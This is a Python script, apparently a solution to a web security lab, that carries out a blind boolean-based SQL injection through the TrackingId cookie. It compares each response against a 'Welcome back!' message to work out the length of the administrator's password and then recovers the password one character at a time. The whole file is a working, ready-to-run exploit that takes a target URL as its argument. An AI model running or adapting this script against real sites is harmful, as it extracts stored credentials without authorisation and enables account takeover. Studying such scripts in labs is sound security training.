import requests
from bs4 import BeautifulSoup
import string
import sys


def make_request(url, TrackingID):
    cookie = f"TrackingId={TrackingID};"
    headers = {
        "Cookie": cookie
    }
    res = requests.get(url, headers=headers)
    return res


def search_text(response):
    soup = BeautifulSoup(response.text, 'html.parser')
    if "Welcome back!" in soup.text:
        return True
    else:
        return False


def enumerate_password_length(url):
    for i in range(1, 50):
        TrackingID = f"ABC' OR (select username from users where username='administrator' AND LENGTH(password)={i})='administrator"
        response = make_request(url, TrackingID)
        if search_text(response):
            password_length = i
            break
    return password_length


def enumerate_password(url, password_length):
    alphanumeric_characters = string.ascii_lowercase + string.digits
    password = ""
    print(f"Enumerating password...")
    print("Password: ", end='')
    for i in range(1, password_length + 1):
        for j in alphanumeric_characters:
            TrackingID = f"ABC' OR (select username from users where username='administrator' AND SUBSTRING(password,{i},1)='{j}')='administrator"
            response = make_request(url, TrackingID)
            if search_text(response):
                password = password + j
                print(j, end='', flush=True)
                break
    print()

def main():
    try:
        url = sys.argv[1]
        print("Enumerating Password Length...")
        password_length = enumerate_password_length(url)
        print(f"Password Length: {password_length} characters ")
        enumerate_password(url, password_length)
    except IndexError:
        print(f"Usage: python3 {sys.argv[0]} <url> \nExample: python3 {sys.argv[0]} https://example.com")


if __name__ == "__main__":
    main()




